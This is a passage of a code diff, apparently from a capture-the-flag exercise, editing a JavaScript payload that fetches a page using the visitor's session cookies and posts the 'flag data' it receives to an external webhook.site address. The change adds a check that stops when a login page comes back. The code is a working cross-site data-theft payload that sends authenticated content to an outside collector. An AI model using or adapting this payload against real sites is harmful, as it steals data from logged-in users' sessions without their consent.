@@ -9,9 +9,21 @@
     method: 'GET',
     credentials: 'include'  // Include cookies for the authenticated session
   })
-  .then(res => res.json())
+  .then(res => {
+    // If the response is an HTML page (likely the login page), handle it
+    if (res.headers.get("Content-Type").includes("text/html")) {
+      return res.text();  // Parse HTML if it's an HTML response
+    }
+    return res.json();  // Otherwise, parse JSON as expected
+  })
   .then(data => {
-    // Send the fetched data to the webhook
+    // Check if the response is HTML (login page)
+    if (typeof data === 'string' && data.includes("<html>")) {
+      console.error('Login required. HTML response received instead of JSON.');
+      return;  // Stop execution if the response is HTML
+    }
+    
+    // Send the fetched flag data to the webhook
     fetch("https://webhook.site/0bd8b95b-3b87-4edf-96d6-06a0c337d524", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
